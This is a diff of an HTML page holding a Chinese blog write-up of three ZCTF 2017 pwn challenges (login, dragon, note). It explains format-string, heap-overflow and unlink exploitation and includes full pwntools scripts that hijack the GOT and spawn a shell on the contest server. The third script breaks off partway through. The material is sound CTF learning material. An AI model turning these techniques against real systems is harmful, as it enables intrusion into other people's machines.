@@ -1,115 +1,195 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
+<html>
 <head>
-
-    <!-- Title -->
     
-    <title>ZCTF 2017 write up - DazzleP&#39;s Blog</title>
+
+    
+
+    
+
+
+
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-    <!--Description-->
     
-        <meta name="description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
     
-
-    <!--Author-->
     
-        <meta name="author" content="DazzleP">
+    <title>ZCTF 2017 write up | DazzleP&#39;s Blog | A simple record place</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-
-    <!--Favicon-->
+    <meta name="theme-color" content="#3F51B5">
     
-      <link rel="icon" href="images/favicon.ico">
     
-
-    <!--Open Graph Title-->
+    <meta name="keywords" content="ctf,pwn,writeup">
+    <meta name="description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
+<meta name="keywords" content="ctf,pwn,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZCTF 2017 write up">
+<meta property="og:url" content="http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/index.html">
+<meta property="og:site_name" content="DazzleP&#39;s Blog">
+<meta property="og:description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
+<meta property="og:updated_time" content="2017-05-04T15:34:54.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ZCTF 2017 write up">
+<meta name="twitter:description" content="这次ZCTF做了三个pwn，第二天的三题一个都没做出来Orz，不过第一天趁着dalao们都去波士顿钥匙联欢会的时候拿了俩FB还是很开心的">
     
-        <meta property="og:title" content="ZCTF 2017 write up"/>
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="DazzleP&#39;s Blog"/>
-
-    <!--Page Cover-->
-    
-        <meta property="og:image" content="undefined"/>
-    
-
-
-
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/sass/main.css">
-
-    <!--[if lt IE 8]>
-        <script src="/js/ie/html5shiv.js"></script>
-    <![endif]-->
-
-    <!--[if lt IE 8]>
-        <link rel="stylesheet" href="/sass/ie8.css">
-    <![endif]-->
-
-
-    <!-- Google Analytics -->
-    
-
-
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 </head>
 
+<body>
+    <div id="loading" class="active"></div>
 
-<body id="top">
-
-    <!-- Header -->
-    <header id="header">
-  <div class="inner">
-    <a href="/" class="image avatar"><img src="https://www.gravatar.com/avatar/e6cfae2d726e15821ea3c4f0848d5451" alt="" /></a>    <h1><strong>This is Strata</strong>, a free, fully responsive site<br />template designed by <a href="http://html5up.net">HTML5 UP</a>.</h1>
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DazzleP</h5>
+          <a href="mailto:634206017@qq.com" title="634206017@qq.com" class="mail">634206017@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yscoder" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/ysweb" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/custom"  >
+                <i class="icon icon-lg icon-link"></i>
+                测试
+              </a>
+            </li>
+        
+      </ul>
+    </div>
   </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ZCTF 2017 write up</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ZCTF 2017 write up</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2017-02-27T14:28:08.000Z" itemprop="datePublished" class="page-time">
+  2017-02-27
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
 </header>
 
 
-    <!-- Main -->
-		<div id="main">
-
-      <!-- Main Content -->
-      <!-- One -->
-<section id="one">
-  <div class="meta">
-  
-      <span class="date">
-          2017-02-27
-      </span>
-  
-
-  
-
-  
-
-
-</div>
-
-
-
+<div class="container body-wrap">
     
-      <h1 itemprop="name">
-        ZCTF 2017 write up
-      </h1>
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login"><span class="post-toc-number">1.</span> <span class="post-toc-text">login</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dragon"><span class="post-toc-number">2.</span> <span class="post-toc-text">dragon</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#note"><span class="post-toc-number">3.</span> <span class="post-toc-text">note</span></a></li></ol>
+        </nav>
+    </aside>
     
-  
+<article id="post-ZCTF-2017-write-up"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ZCTF 2017 write up</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2017-02-27 22:28:08" datetime="2017-02-27T14:28:08.000Z"  itemprop="datePublished">2017-02-27</time>
+
+            
 
 
-
-    <div class="image main"><img src="http://placehold.it/1300x500" alt="" /></div>
-
-
-<!-- Gallery -->
-
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
 
 
-<!-- Content -->
-<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>刚开始看这题的时候有点不知所云，完全不知道是要leak canary还是爆破来做，第二天想到，<code>succ()</code>中<code>sprintf()</code>函数的格式化字符串参数是在栈上的，<br>尝试下用s1修改他,果然成功修改输出s2的格式(第一天的时候就有这个现象了，当时还以为<code>printf()</code>有bug…)<br>然后就是用格式化字符串修改<code>stack_chk_fail@got</code>，原本是想找个ret的gadget，但是很奇怪的是没办法用格式化字符串精确修改，好像每多输出一个字符修改的结果会多2，<br>后来发现只修改一个字节刚好可以把<code>stack_chk_fail@got</code>修改成<code>malloc@plt + 6</code>这样即使修改了canary函数也可以正常返回，然后就可以愉快的做ROP了<br>然后做ROP执行<code>system(&#39;/bin/sh&#39;)</code>的时候老是失败，感觉是因为前面的格式化字符串修改了太多栈的内容影响到了<code>system()</code>,<br>于是转而用syscall执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code>这里要把ecx,edx都设置为0，然而<code>sprintf()</code>遇到\x00就断了，<br>调试的时候发现执行ROP的时候edx已经为0了，然后在题目给的libc里面找到了这么一个gadget</p>
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>刚开始看这题的时候有点不知所云，完全不知道是要leak canary还是爆破来做，第二天想到，<code>succ()</code>中<code>sprintf()</code>函数的格式化字符串参数是在栈上的，<br>尝试下用s1修改他,果然成功修改输出s2的格式(第一天的时候就有这个现象了，当时还以为<code>printf()</code>有bug…)<br>然后就是用格式化字符串修改<code>stack_chk_fail@got</code>，原本是想找个ret的gadget，但是很奇怪的是没办法用格式化字符串精确修改，好像每多输出一个字符修改的结果会多2，<br>后来发现只修改一个字节刚好可以把<code>stack_chk_fail@got</code>修改成<code>malloc@plt + 6</code>这样即使修改了canary函数也可以正常返回，然后就可以愉快的做ROP了<br>然后做ROP执行<code>system(&#39;/bin/sh&#39;)</code>的时候老是失败，感觉是因为前面的格式化字符串修改了太多栈的内容影响到了<code>system()</code>,<br>于是转而用syscall执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code>这里要把ecx,edx都设置为0，然而<code>sprintf()</code>遇到\x00就断了，<br>调试的时候发现执行ROP的时候edx已经为0了，然后在题目给的libc里面找到了这么一个gadget</p>
 <pre><code>0x000282d3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
 </code></pre><p>然后就可以愉快的getshell了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x0804878C</span></div><div class="line">stack_chk_fail_got = <span class="number">0x0804A014</span></div><div class="line">malloc_got = <span class="number">0x0804A018</span></div><div class="line">puts_plt = <span class="number">0x080484C0</span></div><div class="line">ret = <span class="number">0x804844e</span></div><div class="line">pop_ret = <span class="number">0x08048465</span></div><div class="line">inc_ecx_ret = <span class="number">0x08048aee</span></div><div class="line">ebx_ret = <span class="number">0x08048465</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">i = 1</div><div class="line">while i &lt; 100:</div><div class="line">    p = process('./login')</div><div class="line">    p.recvuntil('Input the username:')</div><div class="line">    payload = ''</div><div class="line">    payload += p32(stack_chk_fail_got)</div><div class="line">    payload += 'A' * (0x4c)</div><div class="line">    payload += p32(main_addr)</div><div class="line">    payload += p32(stack_chk_fail_got) * 9 + 'AA'</div><div class="line">    payload += 'KK:%' + str(i) + '$x'</div><div class="line">    p.send(payload + '\n')</div><div class="line">    p.recvuntil('Input the password:')</div><div class="line">    p.send('123\n')</div><div class="line">    p.recvuntil("$x:")</div><div class="line">    data = int(p.recvuntil(':', drop = True), 16)</div><div class="line">    if data == stack_chk_fail_got:</div><div class="line">        print "succ", i</div><div class="line">        exit(0)</div><div class="line">    p.close()</div><div class="line">    i = i + 1</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="comment">#p = process('./login')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4002</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p32(stack_chk_fail_got)</div><div class="line">payload += p32(stack_chk_fail_got + <span class="number">1</span>) * <span class="number">19</span></div><div class="line">payload += p32(main_addr)</div><div class="line">payload += p32(stack_chk_fail_got) * <span class="number">9</span> + <span class="string">'AA'</span></div><div class="line">payload += <span class="string">'K:%47c'</span></div><div class="line">payload += <span class="string">'%10$hhn'</span></div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(pop_ret)</div><div class="line">payload += p32(malloc_got)</div><div class="line">payload += p32(main_addr)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">malloc_addr = u32(p.recvn(<span class="number">4</span>))</div><div class="line">log.info(<span class="string">'malloc() addr: '</span> + hex(malloc_addr))</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"><span class="comment">#libc = ELF('./local.libc32')</span></div><div class="line"></div><div class="line">offset_malloc = libc.symbols[<span class="string">'malloc'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">offset_binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">libc_base = malloc_addr - offset_malloc</div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh_addr = libc_base + offset_binsh</div><div class="line"></div><div class="line"><span class="comment">#int80 = libc_base + 0x000B14DD</span></div><div class="line">int80 = libc_base + <span class="number">0x000B4EBB</span></div><div class="line">xorecx_ebx_pppop_ret = libc_base + <span class="number">0x000282d3</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(xorecx_ebx_pppop_ret)</div><div class="line">payload += p32(binsh_addr)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">3</span></div><div class="line">payload += p32(int80)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
@@ -117,140 +197,294 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, name, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input new note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./dragon')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">11501</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'C'</span> * <span class="number">0x10</span>, <span class="string">'D'</span> * <span class="number">0x20</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x20</span>)</div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">List(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x10</span>)</div><div class="line">data = p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>)</div><div class="line"><span class="keyword">if</span> len(data) &lt; <span class="number">4</span>:</div><div class="line">    log.error(<span class="string">"maybe error!"</span>)</div><div class="line">    exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">heap_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">fake_note = heap_addr + <span class="number">0x80</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'E'</span> * <span class="number">0x20</span>, <span class="string">'F'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x18</span>, <span class="string">'G'</span> * <span class="number">0x18</span>, <span class="string">'H'</span> * <span class="number">0x17</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, <span class="string">'H'</span> * <span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</div><div class="line"></div><div class="line">top_chunk = heap_addr + <span class="number">0x148</span></div><div class="line">offset = <span class="number">0x00000000006020e0</span> - top_chunk</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">p.send(<span class="string">'1\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">p.send(str(offset - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">p.send(p64(fake_note))</div><div class="line"></div><div class="line">List(p, <span class="number">2</span>)</div><div class="line">p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>)</div><div class="line">libc_start_main_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"__libc_start_main() addr: "</span> + hex(libc_start_main_addr))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line">offset_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">libc_base = libc_start_main_addr - offset_libc_start_main</div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, p64(system_addr))</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'SH'</span>, <span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
 <h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><code>note</code>结构体中有<code>Title</code>和<code>content</code>，特别没良心的不给<code>Show</code>功能，<br>漏洞点在<code>EditContent</code>功能一次只能修改48个字节的<code>content</code>，但是允许从<code>content</code>后部开始修改，<br>程序使用的是talloc，网上搜索了一波发现貌似还有点复杂，不过调试发现talloc的chunk只是拓展了ptmalloc的堆块结构，<br>而且释放内存实际上最终还是要执行ptmalloc的<code>free()</code>，所以完全可以当作老式的linux exploit来搞<br>利用溢出来做unlink attack，然后我们就的到了一个指向在<code>bss</code>段的<code>note list</code>的指针，修改<code>_talloc_free@got</code>为<code>puts@plt + 6</code>，这样就把<code>Delete()</code>变成了<code>Show</code><br>但这样并不能leak libc,因为在程序释放内存之前会对堆块做检查，这样就无法直接读<code>got</code>，只能leak堆上的<code>main_arena</code>指针了<br>在这之前要先得到堆地址，<code>note</code>结构体中，<code>Title</code>紧跟着<code>content_ptr</code>，把<code>Title</code>填满就可以leak heap了，<br>但是程序的<code>ChangeTitle()</code>函数读取输入的时候会在输入的末尾补<code>\x00</code>，而且非常诡异的是只要把Title填满，下一次<code>atoi()</code>函数的结果一定会为0，程序直接退出<br>后来发现<code>EditContent()</code>是不会在输入末尾补<code>\x00</code>的，然后利用之前unlink的到的指针修改note list，将其作为一个<code>note</code>结构体，<br>这样就可以用<code>EditContent()</code>的方法修改某个note的<code>Title</code>,然后打印出来就可以的到堆的地址，<br>之后要打印出堆上的<code>main_arena</code>指针，但是<code>main_arena</code>指针的位置在堆块的头部，并不在<code>Title</code>的位置，无法通过<code>Delete()</code>函数的检查，<br>所以在这之前，利用之前指向note list的指针，多次修改堆内容，将<code>main_arena</code>指针前面的内容修改成一个talloc的chunk头部，然后就可以通过检查，将<code>main_arena</code>的指针打印出来<br>然后就可以修改<code>atoi@got</code>为<code>system()</code>，输入<code>/bin/sh</code>就可以getshell了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span 